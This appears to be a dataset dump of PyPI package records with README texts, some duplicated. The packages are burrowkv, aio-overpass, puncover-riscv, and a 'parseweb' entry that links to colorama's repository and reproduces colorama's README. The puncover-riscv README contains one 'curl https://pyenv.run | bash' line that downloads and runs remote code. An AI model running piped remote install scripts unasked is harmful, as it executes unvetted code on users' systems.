
Burrowkv is a simple key-value store implementation in Python. It provides basic functionality to store and retrieve key-value pairs, as well as additional features such as JSON serialization and deserialization.

## Features

- Set a value for a given key.
- Retrieve the value associated with a key.
- Delete a key-value pair.
- Check if a key exists in the store.
- Get a list of all keys.
- Get a list of all values.
- Get a list of all key-value pairs.
- Serialize the key-value store to JSON.
- Deserialize JSON into the key-value store.

## Installation

```
pip install burrowkv
```

## Usage
```
from burrowkv import burrowkv

# Create a new instance of burrowkv
store = burrowkv()

# Set a value for a key
store.set('name', 'John')

# Retrieve the value associated with a key
name = store.get('name')  # Returns 'John'

# Delete a key-value pair
store.delete('name')

# Check if a key exists
if store.contains('name'):
    print('Key exists')
else:
    print('Key does not exist')

# Get a list of all keys
keys = store.keys()  # Returns a list of keys

# Get a list of all values
values = store.values()  # Returns a list of values

# Get a list of all key-value pairs
items = store.items()  # Returns a list of (key, value) tuples

# Serialize the key-value store to JSON

json_data = store.to_json()

# Deserialize JSON into the key-value store
store.from_json(json_data)
```

## License
This project is licensed under the MIT License. See the LICENSE file for more information.

",iunary/burrowkv
solverpy,https://github.com/cbboyan/solverpy,0,0,0,,,cbboyan/solverpy
aio-overpass,https://github.com/timwie/aio-overpass,4,8008,7960,"<h1 align=""center"">
aio-overpass

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/timwie/aio-overpass/ci.yml)](https://github.com/timwie/aio-overpass/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/timwie/aio-overpass/branch/main/graph/badge.svg?token=YX1218U740)](https://codecov.io/gh/timwie/aio-overpass)
[![PyPI version](https://badge.fury.io/py/aio_overpass.svg)](https://badge.fury.io/py/aio_overpass)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/aio-overpass)
</h1>

A client for the [Overpass API], a read-only API that serves up custom selected
parts of [OpenStreetMap] data. It is optimized for data consumers that need a few
elements within a glimpse or up to roughly 10 million elements in some minutes,
both selected by search criteria like location, type of objects, tag properties,
proximity, or combinations of them. To make use of it, you should familiarize yourself
with [Overpass QL], the query language used to select the elements that you want.

#### Contents
- [Features](#features)
- [Getting Started](#getting-started)
  - [Choosing Extras](#choosing-extras)
- [Basic Usage](#basic-usage)
  - [Example](#example)
- [Motivation](#motivation)
- [Related Projects](#related-projects)
- [License](#license)

#### See also
- An overview of modules, classes and functions can be found in the [API reference](http://www.timwie.dev/aio-overpass/).
- The version history is available in [CHANGELOG.md](https://github.com/timwie/aio-overpass/blob/main/CHANGELOG.md).
- Contributor guide is forthcoming :construction:

<br>

## Features
- Asynchronous requests using [aiohttp]
- Concurrent queries
- Respects rate limits
- Fault tolerance through (customizable) retries
- **Extensions**
  - Typed elements that simplify browsing result sets
  - [Shapely] geometries for manipulation and analysis
  - [GeoJSON] exports
  - Simplified querying and processing of public transportation routes

<br>

## Getting Started
```sh
pip install aio-overpass
pip install aio-overpass[shapely, networkx, joblib]

poetry add aio-overpass
poetry add aio-overpass[shapely, networkx, joblib]
```

### Choosing Extras
This library can be installed with a number of optional extras.

- Install no extras, if you're fine with `dict` result sets.

- Install the `shapely` extra, if you would like the convenience of typed OSM elements.
  It is also useful if you are interested in elements' geometries,
  and either already use Shapely, or want a simple way to export [GeoJSON] or [WKT].

  - This includes the `pt` module to make it easier to interact with public transportation routes.
    Something seemingly trivial like listing the stops of a route can have unexpected pitfalls,
    since stops can have multiple route members, and may have a range of different tags and roles.
    This submodule will clean up the relation data for you.

- Install the `networkx` extra to enable the `pt_ordered` module, if you want a route's path as a 
  simple line from A to B. It is hard to do this consistently, mainly because ways are not always
  ordered, and stop positions might be missing. You can benefit from this submodule if you wish to
  - render a route's path between any two stops
  - measure the route's travelled distance between any two stops
  - validate the order of ways in the relation
  - check if the route relation has gaps

- Install the `joblib` extra to speed up `pt_ordered.collect_ordered_routes`, which can benefit
  greatly from parallelization.

<br>

## Basic Usage
There are three basic steps to fetch the spatial data you need:

1. **Formulate a query**
    - Either write your own custom query, f.e. `Query(""node(5369192667); out;"")`,
    - or use one of the `Query` subclasses, f.e. `SingleRouteQuery(relation_id=1643324)`.

2. **Call the Overpass API**
    - Prepare your client with `client = Client(user_agent=...)`.
    - Use `await client.run_query(query)` to fetch the result set.

3. **Collect results**
    - Either access the raw result dictionaries with `query.result_set`,
    - or use a collector, f.e. `collect_elements(query)` to get a list of typed `Elements`.
    - Collectors are often specific to queries - `collect_routes` requires a `RouteQuery`,
      for instance.

### Example
#### Results as Dictionaries
```python
from aio_overpass import Client, Query

query = Query(""way(24981342); out geom;"")

client = Client()

await client.run_query(query)

query.result_set
```

```python
{
    # ...
    ""elements"": [
        {
            ""type"": ""way"",
            ""id"": 24981342,
            # ...
            ""tags"": {
                ""addr:city"": ""Hamburg"",
                ""addr:country"": ""DE"",
                ""addr:housename"": ""Elbphilharmonie"",
                # ...
            },
        }
    ],
}
```

#### Results as Objects
```python
from aio_overpass.element import collect_elements

elems = collect_elements(query)

elems[0].tags
```

```python
{
    ""addr:city"": ""Hamburg"",
    ""addr:country"": ""DE"",
    ""addr:housename"": ""Elbphilharmonie"",
    # ...
}

```

#### Results as GeoJSON
```python
import json

json.dumps(elems[0].geojson, indent=4)
```

```json
{
    ""type"": ""Feature"",
    ""geometry"": {
        ""type"": ""Polygon"",
        ""coordinates"": [
            [
                [
                    9.9832434,
                    53.5415472
                ],
                ...
            ]
        ]
    },
    ""properties"": {
        ""id"": 24981342,
        ""type"": ""way"",
        ""tags"": {
            ""addr:city"": ""Hamburg"",
            ""addr:country"": ""DE"",
            ""addr:housename"": ""Elbphilharmonie"",
            ...
        },
        ...
    },
    ""bbox"": [
        9.9832434,
        53.540877,
        9.9849674
        53.5416212,
    ]
}
```

<br>

## Motivation

### Goals
- A small and stable set of core functionality.
- Good defaults for queries and retrying.
- Room for extensions that simplify querying and/or processing of spatial data
  in specific problem domains.
- Sensible and spec-compliant GeoJSON exports for all objects that represent spatial features.
- Detailed documentation that supplements learning about OSM and the Overpass API.

### Non-Goals
- Any sort of Python interface to replace writing Overpass QL code.
- Integrating other OSM-related services (like the OSM API or Nominatim)
- Command line interface

<br>

## Related Projects
- [Overpass API](https://github.com/drolbr/Overpass-API)
- [Overpass Turbo], the best choice to prototype your queries in a browser
- [Folium], which can be used to visualize GeoJSON on [Leaflet] maps
- [OSMnx], which is specialized on street networks
- [overpass-api-python-wrapper], another Python client for the Overpass API
- [overpy], another Python client for the Overpass API
- [OSMPythonTools], a Python client for OSM-related services 
- [overpassify], a Python to Overpass QL transpiler

<br>

## License
Distributed under the MIT License. See `LICENSE` for more information.


[Overpass API]: https://wiki.openstreetmap.org/wiki/Overpass_API
[Overpass QL]: https://wiki.openstreetmap.org/wiki/Overpass_API/Overpass_QL
[OpenStreetMap]: https://www.openstreetmap.org

[Overpass Turbo]: http://overpass-turbo.eu/
[Folium]: https://python-visualization.github.io/folium/
[Leaflet]: https://leafletjs.com/
[overpass-api-python-wrapper]: https://github.com/mvexel/overpass-api-python-wrapper
[overpy]: https://github.com/DinoTools/python-overpy
[OSMnx]: https://github.com/gboeing/osmnx
[OSMPythonTools]: https://github.com/mocnik-science/osm-python-tools
[overpassify]: https://github.com/gappleto97/overpassify

[aiohttp]: https://docs.aiohttp.org/en/stable/
[Joblib]: https://joblib.readthedocs.io/en/latest/
[NetworkX]: https://networkx.github.io/
[PyGeodesy]: https://mrjean1.github.io/PyGeodesy/
[Shapely]: https://shapely.readthedocs.io/en/latest/manual.html

[GeoJSON]: https://en.wikipedia.org/wiki/GeoJSON
[WKT]: https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry

","
aio-overpass

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/timwie/aio-overpass/ci.yml)](https://github.com/timwie/aio-overpass/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/timwie/aio-overpass/branch/main/graph/badge.svg?token=YX1218U740)](https://codecov.io/gh/timwie/aio-overpass)
[![PyPI version](https://badge.fury.io/py/aio_overpass.svg)](https://badge.fury.io/py/aio_overpass)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/aio-overpass)


A client for the [Overpass API], a read-only API that serves up custom selected
parts of [OpenStreetMap] data. It is optimized for data consumers that need a few
elements within a glimpse or up to roughly 10 million elements in some minutes,
both selected by search criteria like location, type of objects, tag properties,
proximity, or combinations of them. To make use of it, you should familiarize yourself
with [Overpass QL], the query language used to select the elements that you want.

#### Contents
- [Features](#features)
- [Getting Started](#getting-started)
  - [Choosing Extras](#choosing-extras)
- [Basic Usage](#basic-usage)
  - [Example](#example)
- [Motivation](#motivation)
- [Related Projects](#related-projects)
- [License](#license)

#### See also
- An overview of modules, classes and functions can be found in the [API reference](http://www.timwie.dev/aio-overpass/).
- The version history is available in [CHANGELOG.md](https://github.com/timwie/aio-overpass/blob/main/CHANGELOG.md).
- Contributor guide is forthcoming :construction:



## Features
- Asynchronous requests using [aiohttp]
- Concurrent queries
- Respects rate limits
- Fault tolerance through (customizable) retries
- **Extensions**
  - Typed elements that simplify browsing result sets
  - [Shapely] geometries for manipulation and analysis
  - [GeoJSON] exports
  - Simplified querying and processing of public transportation routes



## Getting Started
```sh
pip install aio-overpass
pip install aio-overpass[shapely, networkx, joblib]

poetry add aio-overpass
poetry add aio-overpass[shapely, networkx, joblib]
```

### Choosing Extras
This library can be installed with a number of optional extras.

- Install no extras, if you're fine with `dict` result sets.

- Install the `shapely` extra, if you would like the convenience of typed OSM elements.
  It is also useful if you are interested in elements' geometries,
  and either already use Shapely, or want a simple way to export [GeoJSON] or [WKT].

  - This includes the `pt` module to make it easier to interact with public transportation routes.
    Something seemingly trivial like listing the stops of a route can have unexpected pitfalls,
    since stops can have multiple route members, and may have a range of different tags and roles.
    This submodule will clean up the relation data for you.

- Install the `networkx` extra to enable the `pt_ordered` module, if you want a route's path as a 
  simple line from A to B. It is hard to do this consistently, mainly because ways are not always
  ordered, and stop positions might be missing. You can benefit from this submodule if you wish to
  - render a route's path between any two stops
  - measure the route's travelled distance between any two stops
  - validate the order of ways in the relation
  - check if the route relation has gaps

- Install the `joblib` extra to speed up `pt_ordered.collect_ordered_routes`, which can benefit
  greatly from parallelization.



## Basic Usage
There are three basic steps to fetch the spatial data you need:

1. **Formulate a query**
    - Either write your own custom query, f.e. `Query(""node(5369192667); out;"")`,
    - or use one of the `Query` subclasses, f.e. `SingleRouteQuery(relation_id=1643324)`.

2. **Call the Overpass API**
    - Prepare your client with `client = Client(user_agent=...)`.
    - Use `await client.run_query(query)` to fetch the result set.

3. **Collect results**
    - Either access the raw result dictionaries with `query.result_set`,
    - or use a collector, f.e. `collect_elements(query)` to get a list of typed `Elements`.
    - Collectors are often specific to queries - `collect_routes` requires a `RouteQuery`,
      for instance.

### Example
#### Results as Dictionaries
```python
from aio_overpass import Client, Query

query = Query(""way(24981342); out geom;"")

client = Client()

await client.run_query(query)

query.result_set
```

```python
{
    # ...
    ""elements"": [
        {
            ""type"": ""way"",
            ""id"": 24981342,
            # ...
            ""tags"": {
                ""addr:city"": ""Hamburg"",
                ""addr:country"": ""DE"",
                ""addr:housename"": ""Elbphilharmonie"",
                # ...
            },
        }
    ],
}
```

#### Results as Objects
```python
from aio_overpass.element import collect_elements

elems = collect_elements(query)

elems[0].tags
```

```python
{
    ""addr:city"": ""Hamburg"",
    ""addr:country"": ""DE"",
    ""addr:housename"": ""Elbphilharmonie"",
    # ...
}

```

#### Results as GeoJSON
```python
import json

json.dumps(elems[0].geojson, indent=4)
```

```json
{
    ""type"": ""Feature"",
    ""geometry"": {
        ""type"": ""Polygon"",
        ""coordinates"": [
            [
                [
                    9.9832434,
                    53.5415472
                ],
                ...
            ]
        ]
    },
    ""properties"": {
        ""id"": 24981342,
        ""type"": ""way"",
        ""tags"": {
            ""addr:city"": ""Hamburg"",
            ""addr:country"": ""DE"",
            ""addr:housename"": ""Elbphilharmonie"",
            ...
        },
        ...
    },
    ""bbox"": [
        9.9832434,
        53.540877,
        9.9849674
        53.5416212,
    ]
}
```



## Motivation

### Goals
- A small and stable set of core functionality.
- Good defaults for queries and retrying.
- Room for extensions that simplify querying and/or processing of spatial data
  in specific problem domains.
- Sensible and spec-compliant GeoJSON exports for all objects that represent spatial features.
- Detailed documentation that supplements learning about OSM and the Overpass API.

### Non-Goals
- Any sort of Python interface to replace writing Overpass QL code.
- Integrating other OSM-related services (like the OSM API or Nominatim)
- Command line interface



## Related Projects
- [Overpass API](https://github.com/drolbr/Overpass-API)
- [Overpass Turbo], the best choice to prototype your queries in a browser
- [Folium], which can be used to visualize GeoJSON on [Leaflet] maps
- [OSMnx], which is specialized on street networks
- [overpass-api-python-wrapper], another Python client for the Overpass API
- [overpy], another Python client for the Overpass API
- [OSMPythonTools], a Python client for OSM-related services 
- [overpassify], a Python to Overpass QL transpiler



## License
Distributed under the MIT License. See `LICENSE` for more information.


[Overpass API]: https://wiki.openstreetmap.org/wiki/Overpass_API
[Overpass QL]: https://wiki.openstreetmap.org/wiki/Overpass_API/Overpass_QL
[OpenStreetMap]: https://www.openstreetmap.org

[Overpass Turbo]: http://overpass-turbo.eu/
[Folium]: https://python-visualization.github.io/folium/
[Leaflet]: https://leafletjs.com/
[overpass-api-python-wrapper]: https://github.com/mvexel/overpass-api-python-wrapper
[overpy]: https://github.com/DinoTools/python-overpy
[OSMnx]: https://github.com/gboeing/osmnx
[OSMPythonTools]: https://github.com/mocnik-science/osm-python-tools
[overpassify]: https://github.com/gappleto97/overpassify

[aiohttp]: https://docs.aiohttp.org/en/stable/
[Joblib]: https://joblib.readthedocs.io/en/latest/
[NetworkX]: https://networkx.github.io/
[PyGeodesy]: https://mrjean1.github.io/PyGeodesy/
[Shapely]: https://shapely.readthedocs.io/en/latest/manual.html

[GeoJSON]: https://en.wikipedia.org/wiki/GeoJSON
[WKT]: https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry

",timwie/aio-overpass
puncover-riscv,https://github.com/Egahp/puncover_riscv,3,3554,3554,"
.. image:: https://img.shields.io/badge/GitHub-Egahp/puncover_riscv-8da0cb?style=flat-square&logo=github
   :alt: GitHub Link
   :target: https://github.com/Egahp/puncover_riscv

.. image:: https://img.shields.io/github/workflow/status/Egahp/puncover_riscv/Python%20package/master?style=flat-square
   :alt: GitHub Workflow Status (branch)
   :target: https://github.com/Egahp/puncover_riscv/actions?query=branch%3Amaster+

.. image:: https://img.shields.io/codecov/c/github/Egahp/puncover_riscv/master?style=flat-square
   :alt: Codecov branch
   :target: https://codecov.io/gh/Egahp/puncover_riscv

.. image:: https://img.shields.io/pypi/v/puncover_riscv?style=flat-square
   :alt: PyPI
   :target: https://pypi.org/project/puncover_riscv

.. image:: https://img.shields.io/pypi/pyversions/puncover_riscv?style=flat-square
   :alt: PyPI - Python Version
   :target: https://pypi.org/project/puncover_riscv

.. image:: https://img.shields.io/github/license/Egahp/puncover?color=blue&style=flat-square
   :alt: License - MIT
   :target: https://github.com/Egahp/puncover_riscv

puncover
========

.. image:: https://raw.githubusercontent.com/Egahp/puncover_riscv/master/images/overview.png

Analyzes RISCV C/C++ binaries for code size, static variables and stack usages. It
creates a report with disassembler and call-stack analysis per directory, file,
or function.This project based on https://github.com/HBehrens/puncover, but only support arch riscv.
Add -fstask-usage to your gcc build flag. By Heiko Behrens - MIT license, copyright © 2014-2017

Installation and Usage
======================

Install with pip:

.. code-block:: bash

   pip install puncover_riscv

Run it by passing the binary to analyze:

.. code-block:: bash

   puncover_riscv --elf_file project.elf
   ...
   * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

Open the link in your browser to view the analysis.

Running Tests Locally
=====================

To run the tests locally, you need to install the development dependencies:

1. install pyenv: https://github.com/pyenv/pyenv

   ..  code-block:: bash

         curl https://pyenv.run | bash

2. install all the python environments, using this bashism (this can take a few
   minutes):

   ..  code-block:: bash

         for _py in $(<.python-version ); do pyenv install ${_py}; done

3. install the development dependencies:

   ..  code-block:: bash

      pip install -r requirements-dev.txt


Then you can run the tests with:

..  code-block:: bash

   tox

Publishing Release
==================

1. Update the version in ``puncover_riscv/__version__.py``.
2. Commit the version update:
   ..  code-block:: bash

   git add . && git commit -m ""Bump version to x.y.z""


3. Create an annotated tag:
   ..  code-block:: bash

   git tag -a {-m=,}x.y.z

4. Push the commit and tag:
   ..  code-block:: bash

   git push && git push --tags

5. Either wait for the GitHub Action to complete and download the release
   artifact for uploading: https://github.com/Egahp/puncover_riscv/actions OR Build
   the package locally: ``python setup.py sdist bdist_wheel``
6. Upload the package to PyPI:
   ..  code-block:: bash

   twine upload dist/*

7. Create GitHub releases:
   - ``gh release create --generate-notes x.y.z``
   - attach the artifacts to the release too: ``gh release upload x.y.z dist/*``

Release Script
--------------

See ``scripts/release.sh`` for a script that automates the above steps.

Contributing
============

Contributions are welcome! Please open an issue or pull request on GitHub.


","
.. image:: https://img.shields.io/badge/GitHub-Egahp/puncover_riscv-8da0cb?style=flat-square&logo=github
   :alt: GitHub Link
   :target: https://github.com/Egahp/puncover_riscv

.. image:: https://img.shields.io/github/workflow/status/Egahp/puncover_riscv/Python%20package/master?style=flat-square
   :alt: GitHub Workflow Status (branch)
   :target: https://github.com/Egahp/puncover_riscv/actions?query=branch%3Amaster+

.. image:: https://img.shields.io/codecov/c/github/Egahp/puncover_riscv/master?style=flat-square
   :alt: Codecov branch
   :target: https://codecov.io/gh/Egahp/puncover_riscv

.. image:: https://img.shields.io/pypi/v/puncover_riscv?style=flat-square
   :alt: PyPI
   :target: https://pypi.org/project/puncover_riscv

.. image:: https://img.shields.io/pypi/pyversions/puncover_riscv?style=flat-square
   :alt: PyPI - Python Version
   :target: https://pypi.org/project/puncover_riscv

.. image:: https://img.shields.io/github/license/Egahp/puncover?color=blue&style=flat-square
   :alt: License - MIT
   :target: https://github.com/Egahp/puncover_riscv

puncover
========

.. image:: https://raw.githubusercontent.com/Egahp/puncover_riscv/master/images/overview.png

Analyzes RISCV C/C++ binaries for code size, static variables and stack usages. It
creates a report with disassembler and call-stack analysis per directory, file,
or function.This project based on https://github.com/HBehrens/puncover, but only support arch riscv.
Add -fstask-usage to your gcc build flag. By Heiko Behrens - MIT license, copyright © 2014-2017

Installation and Usage
======================

Install with pip:

.. code-block:: bash

   pip install puncover_riscv

Run it by passing the binary to analyze:

.. code-block:: bash

   puncover_riscv --elf_file project.elf
   ...
   * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

Open the link in your browser to view the analysis.

Running Tests Locally
=====================

To run the tests locally, you need to install the development dependencies:

1. install pyenv: https://github.com/pyenv/pyenv

   ..  code-block:: bash

         curl https://pyenv.run | bash

2. install all the python environments, using this bashism (this can take a few
   minutes):

   ..  code-block:: bash

         for _py in $(<.python-version ); do pyenv install ${_py}; done

3. install the development dependencies:

   ..  code-block:: bash

      pip install -r requirements-dev.txt


Then you can run the tests with:

..  code-block:: bash

   tox

Publishing Release
==================

1. Update the version in ``puncover_riscv/__version__.py``.
2. Commit the version update:
   ..  code-block:: bash

   git add . && git commit -m ""Bump version to x.y.z""


3. Create an annotated tag:
   ..  code-block:: bash

   git tag -a {-m=,}x.y.z

4. Push the commit and tag:
   ..  code-block:: bash

   git push && git push --tags

5. Either wait for the GitHub Action to complete and download the release
   artifact for uploading: https://github.com/Egahp/puncover_riscv/actions OR Build
   the package locally: ``python setup.py sdist bdist_wheel``
6. Upload the package to PyPI:
   ..  code-block:: bash

   twine upload dist/*

7. Create GitHub releases:
   - ``gh release create --generate-notes x.y.z``
   - attach the artifacts to the release too: ``gh release upload x.y.z dist/*``

Release Script
--------------

See ``scripts/release.sh`` for a script that automates the above steps.

Contributing
============

Contributions are welcome! Please open an issue or pull request on GitHub.


",egahp/puncover_riscv
parseweb,https://github.com/tartley/colorama,2,13715,13644,"
Description du projet
Latest Version Supported Python versions Build Status
Colorama

Makes ANSI escape character sequences (for producing colored terminal text and cursor positioning) work under MS Windows.

PyPI for releases | Github for source | Colorama for enterprise on Tidelift

If you find Colorama useful, please Donate with Paypal to the authors. Thank you!
Installation

Tested on CPython 2.7, 3.7, 3.8, 3.9 and 3.10 and Pypy 2.7 and 3.8.

No requirements other than the standard library.

pip install colorama
# or
conda install -c anaconda colorama

Description

ANSI escape character sequences have long been used to produce colored terminal text and cursor positioning on Unix and Macs. Colorama makes this work on Windows, too, by wrapping stdout, stripping ANSI sequences it finds (which would appear as gobbledygook in the output), and converting them into the appropriate win32 calls to modify the state of the terminal. On other platforms, Colorama does nothing.

This has the upshot of providing a simple cross-platform API for printing colored terminal text from Python, and has the happy side-effect that existing applications or libraries which use ANSI sequences to produce colored output on Linux or Macs can now also work on Windows, simply by calling colorama.just_fix_windows_console() (since v0.4.6) or colorama.init() (all versions, but may have other side-effects â€“ see below).

An alternative approach is to install ansi.sys on Windows machines, which provides the same behaviour for all applications running in terminals. Colorama is intended for situations where that isnâ€™t easy (e.g., maybe your app doesnâ€™t have an installer.)

Demo scripts in the source code repository print some colored text using ANSI sequences. Compare their output under Gnome-terminalâ€™s built in ANSI handling, versus on Windows Command-Prompt using Colorama:
ANSI sequences on Ubuntu under gnome-terminal. Same ANSI sequences on Windows, using Colorama.

These screenshots show that, on Windows, Colorama does not support ANSI â€˜dim textâ€™; it looks the same as â€˜normal textâ€™.
Usage
Initialisation

If the only thing you want from Colorama is to get ANSI escapes to work on Windows, then run:

from colorama import just_fix_windows_console
just_fix_windows_console()

If youâ€™re on a recent version of Windows 10 or better, and your stdout/stderr are pointing to a Windows console, then this will flip the magic configuration switch to enable Windowsâ€™ built-in ANSI support.

If youâ€™re on an older version of Windows, and your stdout/stderr are pointing to a Windows console, then this will wrap sys.stdout and/or sys.stderr in a magic file object that intercepts ANSI escape sequences and issues the appropriate Win32 calls to emulate them.

In all other circumstances, it does nothing whatsoever. Basically the idea is that this makes Windows act like Unix with respect to ANSI escape handling.

Itâ€™s safe to call this function multiple times. Itâ€™s safe to call this function on non-Windows platforms, but it wonâ€™t do anything. Itâ€™s safe to call this function when one or both of your stdout/stderr are redirected to a file â€“ it wonâ€™t do anything to those streams.

Alternatively, you can use the older interface with more features (but also more potential footguns):

from colorama import init
init()

This does the same thing as just_fix_windows_console, except for the following differences:

    Itâ€™s not safe to call init multiple times; you can end up with multiple layers of wrapping and broken ANSI support.

    Colorama will apply a heuristic to guess whether stdout/stderr support ANSI, and if it thinks they donâ€™t, then it will wrap sys.stdout and sys.stderr in a magic file object that strips out ANSI escape sequences before printing them. This happens on all platforms, and can be convenient if you want to write your code to emit ANSI escape sequences unconditionally, and let Colorama decide whether they should actually be output. But note that Coloramaâ€™s heuristic is not particularly clever.

    init also accepts explicit keyword args to enable/disable various functionality â€“ see below.

To stop using Colorama before your program exits, simply call deinit(). This will restore stdout and stderr to their original values, so that Colorama is disabled. To resume using Colorama again, call reinit(); it is cheaper than calling init() again (but does the same thing).

Most users should depend on colorama >= 0.4.6, and use just_fix_windows_console. The old init interface will be supported indefinitely for backwards compatibility, but we donâ€™t plan to fix any issues with it, also for backwards compatibility.
Colored Output

Cross-platform printing of colored text can then be done using Coloramaâ€™s constant shorthand for ANSI escape sequences. These are deliberately rudimentary, see below.

from colorama import Fore, Back, Style
print(Fore.RED + 'some red text')
print(Back.GREEN + 'and with a green background')
print(Style.DIM + 'and in dim text')
print(Style.RESET_ALL)
print('back to normal now')

â€¦or simply by manually printing ANSI sequences from your own code:

print('\033[31m' + 'some red text')
print('\033[39m') # and reset to default color

â€¦or, Colorama can be used in conjunction with existing ANSI libraries such as the venerable Termcolor the fabulous Blessings, or the incredible _Rich.

If you wish Coloramaâ€™s Fore, Back and Style constants were more capable, then consider using one of the above highly capable libraries to generate colors, etc, and use Colorama just for its primary purpose: to convert those ANSI sequences to also work on Windows:

SIMILARLY, do not send PRs adding the generation of new ANSI types to Colorama. We are only interested in converting ANSI codes to win32 API calls, not shortcuts like the above to generate ANSI characters.

from colorama import just_fix_windows_console
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
just_fix_windows_console()

# then use Termcolor for all colored text output
print(colored('Hello, World!', 'green', 'on_red'))

Available formatting constants are:

Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Style: DIM, NORMAL, BRIGHT, RESET_ALL

Style.RESET_ALL resets foreground, background, and brightness. Colorama will perform this reset automatically on program exit.

These are fairly well supported, but not part of the standard:

Fore: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX
Back: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX

Cursor Positioning

ANSI codes to reposition the cursor are supported. See demos/demo06.py for an example of how to generate them.
Init Keyword Args

init() accepts some **kwargs to override default behaviour.

init(autoreset=False):

    If you find yourself repeatedly sending reset sequences to turn off color changes at the end of every print, then init(autoreset=True) will automate that:

    from colorama import init
    init(autoreset=True)
    print(Fore.RED + 'some red text')
    print('automatically back to default color again')

init(strip=None):

    Pass True or False to override whether ANSI codes should be stripped from the output. The default behaviour is to strip if on Windows or if output is redirected (not a tty).
init(convert=None):

    Pass True or False to override whether to convert ANSI codes in the output into win32 calls. The default behaviour is to convert if on Windows and output is to a tty (terminal).
init(wrap=True):

    On Windows, Colorama works by replacing sys.stdout and sys.stderr with proxy objects, which override the .write() method to do their work. If this wrapping causes you problems, then this can be disabled by passing init(wrap=False). The default behaviour is to wrap if autoreset or strip or convert are True.

    When wrapping is disabled, colored printing on non-Windows platforms will continue to work as normal. To do cross-platform colored output, you can use Coloramaâ€™s AnsiToWin32 proxy directly:

    import sys
    from colorama import init, AnsiToWin32
    init(wrap=False)
    stream = AnsiToWin32(sys.stderr).stream

    # Python 2
    print >>stream, Fore.BLUE + 'blue text on stderr'

    # Python 3
    print(Fore.BLUE + 'blue text on stderr', file=stream)

Recognised ANSI Sequences

ANSI sequences generally take the form:

ESC [ <param> ; <param> ... <command>

Where <param> is an integer, and <command> is a single letter. Zero or more params are passed to a <command>. If no params are passed, it is generally synonymous with passing a single zero. No spaces exist in the sequence; they have been inserted here simply to read more easily.

The only ANSI sequences that Colorama converts into win32 calls are:

ESC [ 0 m       # reset all (colors and brightness)
ESC [ 1 m       # bright
ESC [ 2 m       # dim (looks same as normal brightness)
ESC [ 22 m      # normal brightness

# FOREGROUND:
ESC [ 30 m      # black
ESC [ 31 m      # red
ESC [ 32 m      # green
ESC [ 33 m      # yellow
ESC [ 34 m      # blue
ESC [ 35 m      # magenta
ESC [ 36 m      # cyan
ESC [ 37 m      # white
ESC [ 39 m      # reset

# BACKGROUND
ESC [ 40 m      # black
ESC [ 41 m      # red
ESC [ 42 m      # green
ESC [ 43 m      # yellow
ESC [ 44 m      # blue
ESC [ 45 m      # magenta
ESC [ 46 m      # cyan
ESC [ 47 m      # white
ESC [ 49 m      # reset

# cursor positioning
ESC [ y;x H     # position cursor at x across, y down
ESC [ y;x f     # position cursor at x across, y down
ESC [ n A       # move cursor n lines up
ESC [ n B       # move cursor n lines down
ESC [ n C       # move cursor n characters forward
ESC [ n D       # move cursor n characters backward

# clear the screen
ESC [ mode J    # clear the screen

# clear the line
ESC [ mode K    # clear the line

Multiple numeric params to the 'm' command can be combined into a single sequence:

ESC [ 36 ; 45 ; 1 m     # bright cyan text on magenta background

All other ANSI sequences of the form ESC [ <param> ; <param> ... <command> are silently stripped from the output on Windows.

Any other form of ANSI sequence, such as single-character codes or alternative initial characters, are not recognised or stripped. It would be cool to add them though. Let me know if it would be useful for you, via the Issues on GitHub.
Status & Known Problems

Iâ€™ve personally only tested it on Windows XP (CMD, Console2), Ubuntu (gnome-terminal, xterm), and OS X.

Some valid ANSI sequences arenâ€™t recognised.

If youâ€™re hacking on the code, see README-hacking.md. ESPECIALLY, see the explanation there of why we do not want PRs that allow Colorama to generate new types of ANSI codes.

See outstanding issues and wish-list: https://github.com/tartley/colorama/issues

If anything doesnâ€™t work for you, or doesnâ€™t do what you expected or hoped for, Iâ€™d love to hear about it on that issues list, would be delighted by patches, and would be happy to grant commit access to anyone who submits a working patch or two.
License

Copyright Jonathan Hartley & Arnon Yaari, 2013-2020. BSD 3-Clause license; see LICENSE file.
Professional support

Tidelift
	

Professional support for colorama is available as part of the Tidelift Subscription. Tidelift gives software development teams a single source for purchasing and maintaining their software, with professional grade assurances from the experts who know it best, while seamlessly integrating with existing tools.
Thanks

See the CHANGELOG for more thanks!

    Marc Schlaich (schlamar) for a setup.py fix for Python2.5.

    Marc Abramowitz, reported & fixed a crash on exit with closed stdout, providing a solution to issue #7â€™s setuptools/distutils debate, and other fixes.

    User â€˜eryksunâ€™, for guidance on correctly instantiating ctypes.windll.

    Matthew McCormick for politely pointing out a longstanding crash on non-Win.

    Ben Hoyt, for a magnificent fix under 64-bit Windows.

    Jesse at Empty Square for submitting a fix for examples in the README.

    User â€˜jamesspâ€™, an observant documentation fix for cursor positioning.

    User â€˜vaal1239â€™, Dave Mckee & Lackner Kristof for a tiny but much-needed Win7 fix.

    Julien Stuyck, for wisely suggesting Python3 compatible updates to README.

    Daniel Griffith for multiple fabulous patches.

    Oscar Lesta for a valuable fix to stop ANSI chars being sent to non-tty output.

    Roger Binns, for many suggestions, valuable feedback, & bug reports.

    Tim Golden for thought and much appreciated feedback on the initial idea.

    User â€˜Zearinâ€™ for updates to the README file.

    John Szakmeister for adding support for light colors

    Charles Merriam for adding documentation to demos

    Jurko for a fix on 64-bit Windows CPython2.5 w/o ctypes

    Florian Bruhin for a fix when stdout or stderr are None

